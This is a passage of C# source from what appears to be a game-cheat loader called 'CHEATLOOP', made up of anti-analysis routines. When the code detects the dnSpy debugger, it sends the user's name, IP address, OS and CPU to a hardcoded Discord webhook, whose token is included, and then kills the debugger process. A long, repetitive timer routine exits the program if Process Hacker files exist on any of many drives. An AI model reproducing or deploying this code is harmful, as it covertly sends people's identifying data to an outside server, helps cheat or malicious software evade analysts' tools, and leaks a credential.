                                                    dcWeb.SendMessage("```css" + Environment.NewLine + "dnSpy detected" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "IP: " + GetIPAddress() + Environment.NewLine + "OS :" + OSName + Environment.NewLine + "CPU: " + cpu + "```");
                                                }
                                                z.Kill();
                                            }
                                            foreach (Process l in Process.GetProcessesByName("dnSpy.Console"))
                                            {
                                                using (DcWebHook dcWeb = new DcWebHook())
                                                {
                                                    ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                                                    foreach (ManagementObject managementObject in mos.Get())
                                                    {
                                                        string cpu = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", null);
                                                        String OSName = managementObject["Caption"].ToString();
                                                        dcWeb.ProfilePicture = "https://cheatloop.com/uploads/monthly_2020_01/1893944789_RTX2BGCC(1).thumb.jpg.2cf439a7414d77449a3eeb04a231f079.jpg";
                                                        dcWeb.UserName = "CHEATLOOP";
                                                        dcWeb.WebHook = "https://canary.discord.com/api/webhooks/778742278759514204/NycSzwZ9Yi2nsh9Il1gBGIpxFbIdO9iaTrRjSSNJidbXFA2k2QwH3rr3migyd_tZ5tQb";
                                                        dcWeb.SendMessage("```css" + Environment.NewLine + "dnSpy.Console detected" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "IP: " + GetIPAddress() + Environment.NewLine + "OS :" + OSName + Environment.NewLine + "CPU: " + cpu + "```");
                                                    }
                                                    l.Kill();
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        //////////////////////////////KILL PROCCESS HACKER STEP 2/////////////////////////////////
        //////////////
        #endregion

        private void timer3_Tick(object sender, EventArgs e)
        {
            #region[c]
            if (File.Exists(@"C:\Program Files\Process Hacker 2\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"C:\Program Files\Process Hacker 2\kprocesshacker.sys"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"C:\Program Files\Process Hacker 2\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"C:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"C:\Program Files\Process Hacker 2\plugins\ExtendedServices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"C:\Program Files\Process Hacker 2\plugins\ExtendedTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"C:\Program Files\Process Hacker 2\plugins\HardwareDevices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"C:\Program Files\Process Hacker 2\plugins\NetworkTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"C:\Program Files\Process Hacker 2\plugins\OnlineChecks.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"C:\Program Files\Process Hacker 2\plugins\SbieSupport.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"C:\Program Files\Process Hacker 2\plugins\ToolStatus.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"C:\Program Files\Process Hacker 2\plugins\Updater.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"C:\Program Files\Process Hacker 2\plugins\UserNotes.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"C:\Program Files\Process Hacker 2\plugins\WindowExplorer.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"C:\Program Files\Process Hacker 2\x86\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"C:\Program Files\Process Hacker 2\x86\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"C:\Program Files\Process Hacker 2\peview.exe"))
            {
                Environment.Exit(0);
            }
            #endregion
            #region[d]
            if (File.Exists(@"D:\Program Files\Process Hacker 2\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"D:\Program Files\Process Hacker 2\kprocesshacker.sys"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"D:\Program Files\Process Hacker 2\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"D:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"D:\Program Files\Process Hacker 2\plugins\ExtendedServices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"D:\Program Files\Process Hacker 2\plugins\ExtendedTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"D:\Program Files\Process Hacker 2\plugins\HardwareDevices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"D:\Program Files\Process Hacker 2\plugins\NetworkTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"D:\Program Files\Process Hacker 2\plugins\OnlineChecks.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"D:\Program Files\Process Hacker 2\plugins\SbieSupport.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"D:\Program Files\Process Hacker 2\plugins\ToolStatus.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"D:\Program Files\Process Hacker 2\plugins\Updater.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"D:\Program Files\Process Hacker 2\plugins\UserNotes.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"D:\Program Files\Process Hacker 2\plugins\WindowExplorer.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"D:\Program Files\Process Hacker 2\x86\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"D:\Program Files\Process Hacker 2\x86\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"D:\Program Files\Process Hacker 2\peview.exe"))
            {
                Environment.Exit(0);
            }
            #endregion
            #region[E]
            if (File.Exists(@"E:\Program Files\Process Hacker 2\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"E:\Program Files\Process Hacker 2\kprocesshacker.sys"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"E:\Program Files\Process Hacker 2\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"E:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"E:\Program Files\Process Hacker 2\plugins\ExtendedServices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"E:\Program Files\Process Hacker 2\plugins\ExtendedTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"E:\Program Files\Process Hacker 2\plugins\HardwareDevices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"E:\Program Files\Process Hacker 2\plugins\NetworkTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"E:\Program Files\Process Hacker 2\plugins\OnlineChecks.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"E:\Program Files\Process Hacker 2\plugins\SbieSupport.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"E:\Program Files\Process Hacker 2\plugins\ToolStatus.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"E:\Program Files\Process Hacker 2\plugins\Updater.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"E:\Program Files\Process Hacker 2\plugins\UserNotes.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"E:\Program Files\Process Hacker 2\plugins\WindowExplorer.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"E:\Program Files\Process Hacker 2\x86\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"E:\Program Files\Process Hacker 2\x86\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"E:\Program Files\Process Hacker 2\peview.exe"))
            {
                Environment.Exit(0);
            }
            #endregion
            #region[F]
            if (File.Exists(@"F:\Program Files\Process Hacker 2\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"F:\Program Files\Process Hacker 2\kprocesshacker.sys"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"F:\Program Files\Process Hacker 2\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"F:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"F:\Program Files\Process Hacker 2\plugins\ExtendedServices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"F:\Program Files\Process Hacker 2\plugins\ExtendedTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"F:\Program Files\Process Hacker 2\plugins\HardwareDevices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"F:\Program Files\Process Hacker 2\plugins\NetworkTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"F:\Program Files\Process Hacker 2\plugins\OnlineChecks.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"F:\Program Files\Process Hacker 2\plugins\SbieSupport.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"F:\Program Files\Process Hacker 2\plugins\ToolStatus.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"F:\Program Files\Process Hacker 2\plugins\Updater.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"F:\Program Files\Process Hacker 2\plugins\UserNotes.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"F:\Program Files\Process Hacker 2\plugins\WindowExplorer.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"F:\Program Files\Process Hacker 2\x86\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"F:\Program Files\Process Hacker 2\x86\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"F:\Program Files\Process Hacker 2\peview.exe"))
            {
                Environment.Exit(0);
            }
            #endregion
            #region[G]
            if (File.Exists(@"G:\Program Files\Process Hacker 2\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"G:\Program Files\Process Hacker 2\kprocesshacker.sys"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"G:\Program Files\Process Hacker 2\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"G:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"G:\Program Files\Process Hacker 2\plugins\ExtendedServices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"G:\Program Files\Process Hacker 2\plugins\ExtendedTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"G:\Program Files\Process Hacker 2\plugins\HardwareDevices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"G:\Program Files\Process Hacker 2\plugins\NetworkTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"G:\Program Files\Process Hacker 2\plugins\OnlineChecks.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"G:\Program Files\Process Hacker 2\plugins\SbieSupport.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"G:\Program Files\Process Hacker 2\plugins\ToolStatus.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"G:\Program Files\Process Hacker 2\plugins\Updater.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"G:\Program Files\Process Hacker 2\plugins\UserNotes.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"G:\Program Files\Process Hacker 2\plugins\WindowExplorer.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"G:\Program Files\Process Hacker 2\x86\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"G:\Program Files\Process Hacker 2\x86\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"G:\Program Files\Process Hacker 2\peview.exe"))
            {
                Environment.Exit(0);
            }
            #endregion
            #region[M]
            if (File.Exists(@"M:\Program Files\Process Hacker 2\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"M:\Program Files\Process Hacker 2\kprocesshacker.sys"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"M:\Program Files\Process Hacker 2\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"M:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"M:\Program Files\Process Hacker 2\plugins\ExtendedServices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"M:\Program Files\Process Hacker 2\plugins\ExtendedTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"M:\Program Files\Process Hacker 2\plugins\HardwareDevices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"M:\Program Files\Process Hacker 2\plugins\NetworkTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"M:\Program Files\Process Hacker 2\plugins\OnlineChecks.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"M:\Program Files\Process Hacker 2\plugins\SbieSupport.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"M:\Program Files\Process Hacker 2\plugins\ToolStatus.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"M:\Program Files\Process Hacker 2\plugins\Updater.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"M:\Program Files\Process Hacker 2\plugins\UserNotes.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"M:\Program Files\Process Hacker 2\plugins\WindowExplorer.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"M:\Program Files\Process Hacker 2\x86\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"M:\Program Files\Process Hacker 2\x86\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"M:\Program Files\Process Hacker 2\peview.exe"))
            {
                Environment.Exit(0);
            }
            #endregion
            #region[S]
            if (File.Exists(@"S:\Program Files\Process Hacker 2\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"S:\Program Files\Process Hacker 2\kprocesshacker.sys"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"S:\Program Files\Process Hacker 2\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"S:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"S:\Program Files\Process Hacker 2\plugins\ExtendedServices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"S:\Program Files\Process Hacker 2\plugins\ExtendedTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"S:\Program Files\Process Hacker 2\plugins\HardwareDevices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"S:\Program Files\Process Hacker 2\plugins\NetworkTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"S:\Program Files\Process Hacker 2\plugins\OnlineChecks.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"S:\Program Files\Process Hacker 2\plugins\SbieSupport.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"S:\Program Files\Process Hacker 2\plugins\ToolStatus.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"S:\Program Files\Process Hacker 2\plugins\Updater.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"S:\Program Files\Process Hacker 2\plugins\UserNotes.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"S:\Program Files\Process Hacker 2\plugins\WindowExplorer.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"S:\Program Files\Process Hacker 2\x86\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"S:\Program Files\Process Hacker 2\x86\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"S:\Program Files\Process Hacker 2\peview.exe"))
            {
                Environment.Exit(0);
            }
            #endregion
            #region[J]
            if (File.Exists(@"J:\Program Files\Process Hacker 2\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"J:\Program Files\Process Hacker 2\kprocesshacker.sys"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"J:\Program Files\Process Hacker 2\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"J:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"J:\Program Files\Process Hacker 2\plugins\ExtendedServices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"J:\Program Files\Process Hacker 2\plugins\ExtendedTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"J:\Program Files\Process Hacker 2\plugins\HardwareDevices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"J:\Program Files\Process Hacker 2\plugins\NetworkTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"J:\Program Files\Process Hacker 2\plugins\OnlineChecks.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"J:\Program Files\Process Hacker 2\plugins\SbieSupport.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"J:\Program Files\Process Hacker 2\plugins\ToolStatus.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"J:\Program Files\Process Hacker 2\plugins\Updater.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"J:\Program Files\Process Hacker 2\plugins\UserNotes.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"J:\Program Files\Process Hacker 2\plugins\WindowExplorer.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"J:\Program Files\Process Hacker 2\x86\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"J:\Program Files\Process Hacker 2\x86\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"J:\Program Files\Process Hacker 2\peview.exe"))
            {
                Environment.Exit(0);
            }
            #region[Z]
            if (File.Exists(@"Z:\Program Files\Process Hacker 2\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"Z:\Program Files\Process Hacker 2\kprocesshacker.sys"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"Z:\Program Files\Process Hacker 2\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"Z:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"Z:\Program Files\Process Hacker 2\plugins\ExtendedServices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"Z:\Program Files\Process Hacker 2\plugins\ExtendedTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"Z:\Program Files\Process Hacker 2\plugins\HardwareDevices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"Z:\Program Files\Process Hacker 2\plugins\NetworkTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"Z:\Program Files\Process Hacker 2\plugins\OnlineChecks.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"Z:\Program Files\Process Hacker 2\plugins\SbieSupport.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"Z:\Program Files\Process Hacker 2\plugins\ToolStatus.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"Z:\Program Files\Process Hacker 2\plugins\Updater.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"Z:\Program Files\Process Hacker 2\plugins\UserNotes.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"Z:\Program Files\Process Hacker 2\plugins\WindowExplorer.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"Z:\Program Files\Process Hacker 2\x86\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"Z:\Program Files\Process Hacker 2\x86\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"Z:\Program Files\Process Hacker 2\peview.exe"))
            {
                Environment.Exit(0);
            }
            #region[U]
            if (File.Exists(@"U:\Program Files\Process Hacker 2\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"U:\Program Files\Process Hacker 2\kprocesshacker.sys"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"U:\Program Files\Process Hacker 2\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"U:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"U:\Program Files\Process Hacker 2\plugins\ExtendedServices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"U:\Program Files\Process Hacker 2\plugins\ExtendedTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"U:\Program Files\Process Hacker 2\plugins\HardwareDevices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"U:\Program Files\Process Hacker 2\plugins\NetworkTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"U:\Program Files\Process Hacker 2\plugins\OnlineChecks.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"U:\Program Files\Process Hacker 2\plugins\SbieSupport.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"U:\Program Files\Process Hacker 2\plugins\ToolStatus.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"U:\Program Files\Process Hacker 2\plugins\Updater.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"U:\Program Files\Process Hacker 2\plugins\UserNotes.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"U:\Program Files\Process Hacker 2\plugins\WindowExplorer.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"U:\Program Files\Process Hacker 2\x86\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"U:\Program Files\Process Hacker 2\x86\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"U:\Program Files\Process Hacker 2\peview.exe"))
            {
                Environment.Exit(0);
            }
            #endregion
            #endregion
            #endregion
            #region[R]
            if (File.Exists(@"R:\Program Files\Process Hacker 2\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"R:\Program Files\Process Hacker 2\kprocesshacker.sys"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"R:\Program Files\Process Hacker 2\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"R:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"R:\Program Files\Process Hacker 2\plugins\ExtendedServices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"R:\Program Files\Process Hacker 2\plugins\ExtendedTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"R:\Program Files\Process Hacker 2\plugins\HardwareDevices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"R:\Program Files\Process Hacker 2\plugins\NetworkTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"R:\Program Files\Process Hacker 2\plugins\OnlineChecks.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"R:\Program Files\Process Hacker 2\plugins\SbieSupport.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"R:\Program Files\Process Hacker 2\plugins\ToolStatus.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"R:\Program Files\Process Hacker 2\plugins\Updater.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"R:\Program Files\Process Hacker 2\plugins\UserNotes.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"R:\Program Files\Process Hacker 2\plugins\WindowExplorer.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"R:\Program Files\Process Hacker 2\x86\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"R:\Program Files\Process Hacker 2\x86\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"R:\Program Files\Process Hacker 2\peview.exe"))
            {
                Environment.Exit(0);
            }
            #endregion
            #region[A]
            if (File.Exists(@"A:\Program Files\Process Hacker 2\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"A:\Program Files\Process Hacker 2\kprocesshacker.sys"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"A:\Program Files\Process Hacker 2\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"A:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"A:\Program Files\Process Hacker 2\plugins\ExtendedServices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"A:\Program Files\Process Hacker 2\plugins\ExtendedTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"A:\Program Files\Process Hacker 2\plugins\HardwareDevices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"A:\Program Files\Process Hacker 2\plugins\NetworkTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"A:\Program Files\Process Hacker 2\plugins\OnlineChecks.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"A:\Program Files\Process Hacker 2\plugins\SbieSupport.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"A:\Program Files\Process Hacker 2\plugins\ToolStatus.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"A:\Program Files\Process Hacker 2\plugins\Updater.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"A:\Program Files\Process Hacker 2\plugins\UserNotes.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"A:\Program Files\Process Hacker 2\plugins\WindowExplorer.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"A:\Program Files\Process Hacker 2\x86\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"A:\Program Files\Process Hacker 2\x86\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"A:\Program Files\Process Hacker 2\peview.exe"))
            {
                Environment.Exit(0);
            }
            #endregion
            #region[I]
            if (File.Exists(@"I:\Program Files\Process Hacker 2\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"I:\Program Files\Process Hacker 2\kprocesshacker.sys"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"I:\Program Files\Process Hacker 2\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"I:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"I:\Program Files\Process Hacker 2\plugins\ExtendedServices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"I:\Program Files\Process Hacker 2\plugins\ExtendedTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"I:\Program Files\Process Hacker 2\plugins\HardwareDevices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"I:\Program Files\Process Hacker 2\plugins\NetworkTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"I:\Program Files\Process Hacker 2\plugins\OnlineChecks.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"I:\Program Files\Process Hacker 2\plugins\SbieSupport.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"I:\Program Files\Process Hacker 2\plugins\ToolStatus.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"I:\Program Files\Process Hacker 2\plugins\Updater.dll"))
            {
                Environment.Exit(0);
            }
            else
